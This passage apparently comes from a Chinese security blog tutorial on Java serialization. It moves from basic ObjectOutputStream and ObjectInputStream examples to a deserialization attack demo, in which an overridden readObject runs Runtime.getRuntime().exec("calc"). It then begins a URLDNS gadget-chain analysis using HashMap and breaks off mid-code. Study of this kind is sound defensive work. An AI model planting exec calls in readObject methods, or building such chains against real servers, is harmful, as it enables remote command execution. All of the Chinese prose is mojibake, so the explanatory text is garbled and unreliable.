class="hljs-comment">//readObjectæ–¹æ³•ç”¨äºå°†å­—èŠ‚æµååºåˆ—åŒ–ä¸ºå¯¹è±¡ã€‚å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼ŒreadObjectæ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥è‡ªå®šä¹‰éœ€è¦ååºåˆ—åŒ–çš„å­—æ®µå’Œé€»è¾‘ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹æŸäº›å­—æ®µè¿›è¡Œè§£å¯†æˆ–è§£å‹æ“ä½œã€‚</span><br></code></pre></td></tr></table></figure><h3 id="0x03-javaååºåˆ—åŒ–åŸºç¡€"><a href="#0x03-javaååºåˆ—åŒ–åŸºç¡€" class="headerlink" title="0x03 javaååºåˆ—åŒ–åŸºç¡€"></a>0x03 javaååºåˆ—åŒ–åŸºç¡€</h3><p>åœ¨Javaä¸­ï¼Œå¦‚æœä¸€ä¸ªç±»éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œéœ€è¦å®ç°<code>java.io.Serializable</code>æ¥å£ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br>&#125;<br></code></pre></td></tr></table></figure><p>JavaåŸç”Ÿå®ç°äº†ä¸€å¥—åºåˆ—åŒ–çš„æœºåˆ¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦é¢å¤–ç¼–å†™ä»£ç ï¼Œåªéœ€è¦å®ç°<code>java.io.Serializable</code>æ¥å£ï¼Œå¹¶è°ƒç”¨<code>ObjectOutputStream</code>ç±»çš„çš„<code>writeObject</code>æ–¹æ³•å³å¯ï¼Œæ¯”å¦‚è¦å¯¹ä¸‹é¢è¿™ä¸ª<code>Person</code>ç±»è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Persona</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123; <span class="hljs-comment">//æ³¨æ„è¿™ä¸ªæ¥å£</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persona</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ .&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persona</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ .&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//å‚è€ƒhttps://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/</span><br></code></pre></td></tr></table></figure><p>å°†å…¶åºåˆ—åŒ–ï¼Œå°†å¯¹è±¡çš„ä¿¡æ¯å†™å…¥åˆ°<code>abc.txt</code>æ–‡ä»¶ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Persona</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persona</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">24</span>);<br>        <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;abc.txt&quot;</span>));<br>        oos.writeObject(person);<br>        oos.close();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ObjectOutputStream æ˜¯ä¸€ä¸ªç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æµçš„ç±»ã€‚</span><br><span class="hljs-comment">//writeObject æ–¹æ³•å°† person å¯¹è±¡å†™å…¥åˆ° ObjectOutputStreamä¸­</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">æœ‰å‚æ„é€ .<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰“å¼€<code>abc.txt</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/javafan1.png" alt="javafan1"></p><p>ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ª <code>ObjectInputStream</code> è¾“å…¥æµï¼Œç„¶åè°ƒç”¨<code>ObjectInputStream</code>å¯¹è±¡çš„ <code>readObject() </code>æ–¹æ³•å¾—åˆ°åºåˆ—åŒ–çš„å¯¹è±¡å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;abc.txt&quot;</span>));<br>        <span class="hljs-type">Persona</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Persona) ois.readObject();<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br>        System.out.println(p);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Person&#123;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;zhangsan&#x27;</span>, <span class="hljs-attribute">age</span>=24&#125;<br></code></pre></td></tr></table></figure><h3 id="0x04-javaååºåˆ—åŒ–å®ä¾‹"><a href="#0x04-javaååºåˆ—åŒ–å®ä¾‹" class="headerlink" title="0x04 javaååºåˆ—åŒ–å®ä¾‹"></a>0x04 javaååºåˆ—åŒ–å®ä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å‚è€ƒhttps://xilitter.github.io/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</span><br><span class="hljs-comment">//Persionæ”¹æˆPerson</span><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">persion</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persion</span>(<span class="hljs-string">&quot;notbad3&quot;</span>,<span class="hljs-number">23</span>);<span class="hljs-comment">//å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">//å®ƒæ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„è¾“å‡ºæµï¼Œç”¨äºå°†åºåˆ—åŒ–åçš„å¯¹è±¡è¾“å‡ºåˆ°å­—èŠ‚æ•°ç»„ä¸­ã€‚</span><br>        <span class="hljs-type">ObjectOutputStream</span>  <span class="hljs-variable">ObjectOutputStream</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-comment">//å°†persionå¯¹è±¡åºåˆ—åŒ–è¾“å‡ºåˆ°byteArrayOutputStreamå¯¹è±¡ä¸­</span><br>        ObjectOutputStream.writeObject(persion);<br>       <br>        System.out.println(byteArrayOutputStream);<span class="hljs-comment">//æ‰“å°</span><br>        System.out.println(<span class="hljs-string">&quot;------------------------&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        <span class="hljs-comment">//å°†äºŒè¿›åˆ¶æ•°æ®è¾“å‡ºåˆ°æ–‡ä»¶ä¸­</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>        <span class="hljs-comment">//åºåˆ—åŒ–</span><br>        oos.writeObject(persion);<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        <span class="hljs-comment">//åˆ›å»ºå¯¹è±¡ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è¯»å–</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">newpersion</span> <span class="hljs-operator">=</span>(Persion) objectInputStream.readObject();<br>        <span class="hljs-comment">//ä» fileInputStream ä¸­è¯»å–åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œå¹¶å°†å…¶è½¬æ¢æˆ Persion å¯¹è±¡ç±»å‹ã€‚</span><br>        System.out.println(newpersion);<span class="hljs-comment">//ååºåˆ—åŒ–è¾“å‡ºè°ƒç”¨tostringå‡½æ•°ï¼Œå› ä¸ºè¿™é‡Œæˆ‘ä»¬æŠŠä¸€ä¸ªå¯¹è±¡è¾“å‡ºäº†</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Persion</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><span class="hljs-comment">//    private transient String name;</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persion</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨<code>toString</code>å‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²è¾“å‡ºå‡ºæ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿å…¶å®å°±æ˜¯<code>toString</code>çš„é‡å†™</p><p><img src="/img/javaafan2.png" alt="javaafan2"></p><p>â€‹å¦‚æœä¸é‡å†™ä½¿ç”¨é»˜è®¤çš„<code>toString</code>æ–¹æ³•ï¼Œ<code>toString()</code> æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«ç±»çš„åç§°ï¼Œåè·Ÿä¸€ä¸ª â€˜@â€™ ç¬¦å·å’Œå¯¹è±¡çš„å“ˆå¸Œç :</p><p><img src="/img/javafan5.png" alt="javafan5"></p><p>â€‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>transient</code>å…³é”®å­—ï¼Œå°†ä¸€äº›é‡è¦çš„ä¿¡æ¯ï¼ˆå¦‚å¯†ç ï¼‰ä¸è¢«è¿›è¡Œåºåˆ—åŒ–ï¼Œå¦‚æœæŸä¸ªå±æ€§è¢«<code>transient</code>å…³é”®å­—ä¿®é¥°çš„è¯ï¼Œåˆ™è¯¥å±æ€§ä¸ä¼šå‚ä¸åˆ°åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œæ­¤æ—¶å°†å…¶è¿›è¡Œååºåˆ—åŒ–åï¼Œå¦‚æœè¯¥å±æ€§æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼Œåˆ™è¿”å›çš„æ˜¯ nullï¼Œå¦‚æœè¯¥å±æ€§æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ int ç±»å‹ï¼‰ï¼Œåˆ™ä¼šè¿”å›é»˜è®¤å€¼ 0ï¼ˆå½“ç„¶ï¼Œboolean çš„é»˜è®¤å€¼æ˜¯ falseï¼‰ã€‚åœ¨ä¸Šé¢é‚£æ®µä»£ç çš„åŸºç¡€ä¸Šåšå¦‚ä¸‹ä¿®æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//private String name; - &gt; private transient String name;</span><br></code></pre></td></tr></table></figure><p><img src="/img/javaafan3.png" alt="javaafan3"></p><h3 id="0x05-é‡å†™"><a href="#0x05-é‡å†™" class="headerlink" title="0x05 é‡å†™"></a>0x05 é‡å†™</h3><p>â€‹ä¸Šé¢çš„æ —å­ä¸­å¯¹<code>toString</code>æ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œåœ¨å®ç° <code>Serializable</code> æ¥å£çš„åŒæ—¶ï¼Œè¿˜å¯ä»¥é‡å†™ <code>writeObject() </code>å’Œ<code>readObject()</code>æ–¹æ³•ï¼Œè¿™æ ·ä¸€æ—¦å¯¹è±¡è¢«åºåˆ—åŒ–æˆ–è¢«ååºåˆ—åŒ–ï¼Œå°±ä¼šè‡ªåŠ¨çš„è°ƒç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œè€Œä¸ä¼šä½¿ç”¨é»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶ã€‚</p><p>â€‹é€ æˆååºåˆ—åŒ–æœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯å¦‚æœè¢«ååºåˆ—åŒ–çš„ç±»é‡å†™äº†<code>writeObject</code>å’Œ<code>readObject</code>æ–¹æ³•ï¼Œ<code>java</code>å°±ä¼šè°ƒç”¨é‡å†™çš„æ–¹æ³•ã€‚å¦‚æœè¯¥é‡å†™æ–¹æ³•ä¸­æ·»åŠ äº†æ¶æ„çš„ï¼Œèƒ½æ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼Œå°±ä¼šè¾¾åˆ°ååºåˆ—åŒ–æ”»å‡»çš„ç›®çš„ã€‚æ¯”å¦‚è¿˜æ˜¯ä¹‹å‰çš„<code>Person</code>ç±»ï¼Œä½†æˆ‘é‡å†™äº†è¯¥ç±»ä¸­çš„<code>readObject</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name:&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span>+<br>                <span class="hljs-string">&quot;, age:&quot;</span> + age +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç é‡å†™äº†readObjectæ–¹æ³•ï¼Œå¹¶ä¸”æ·»åŠ äº†å¼¹å‡ºè®¡ç®—å™¨çš„å‘½ä»¤ï¼Œååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œå®ƒçš„<code>readObject</code>ï¼Œçœ‹çœ‹æ•ˆæœï¼š</p><p><img src="/img/javafan4.png" alt="javafan4"></p><p>â€‹æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚è¿™æ ·æ”»å‡»çœ‹èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œç›´æ¥åœ¨æœåŠ¡ç«¯ä¸Šä¼ ä¸€ä¸ªé‡å†™äº†readObjectæ–¹æ³•çš„ç±»çš„åºåˆ—åŒ–ä¸²ï¼Œç›´æ¥èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯è¿™ç§æ–¹å¼å‡ ä¹ä¸ä¼šå‡ºç°ã€‚ä¸ºä»€ä¹ˆï¼Ÿä½œä¸ºåç«¯å¼€å‘äººå‘˜ï¼Œä¸å¯èƒ½ä¼šåœ¨ä»£ç ä¸­ç•™ä¸‹è¿™ä¹ˆå±é™©çš„readObjectæ–¹æ³•ï¼Œå³ä½¿æœ‰ï¼Œæ— æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿä¸ä¼šçŸ¥é“æ‰€å±è¯¥æ–¹æ³•çš„ç±»åã€‚ï¼ˆå› ä¸ºæœåŠ¡ç«¯ååºåˆ—åŒ–çš„ä¹Ÿåªæœ‰è‡ªå·±çš„ç±»ï¼‰æ™®éçš„ååºåˆ—åŒ–æ”»å‡»æ–¹å¼åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><blockquote><p>å…¥å£ç±»ï¼šé‡å†™äº†readObjectæ–¹æ³•ï¼Œå¹¶ä¸”æ˜¯èƒ½å¤Ÿè¢«ååºåˆ—åŒ–çš„ï¼Œæœ€å¥½æ˜¯jdkè‡ªå¸¦çš„ã€‚ä¾‹å¦‚HashMap</p><p>è°ƒç”¨é“¾ï¼šä¸€ä¸ªç±»çš„æ–¹æ³•åŒ…å«å¦ä¸€ä¸ªç±»è°ƒç”¨åŒååŒç±»å‹çš„æ–¹æ³•</p><p>æ‰§è¡Œç±»ï¼šèƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œæˆ–è€…è¿œç¨‹å†™æ–‡ä»¶çš„ç±»</p></blockquote><h2 id="URLDNSé“¾åˆ†æ"><a href="#URLDNSé“¾åˆ†æ" class="headerlink" title="URLDNSé“¾åˆ†æ"></a>URLDNSé“¾åˆ†æ</h2><p>å…¥å£ç±»é€‰æ‹©äº†<code>Hashmap</code>ï¼Œè·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç»§æ‰¿äº†Serializableæ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br><span class="hljs-comment">//é‡å†™äº†readObjectæ–¹æ³•</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br><span class="hljs-comment">//åé¢çœç•¥</span><br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å‘èµ·DNSè¯·æ±‚ï¼Œæ‰¾<code>URL</code>ç±»çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 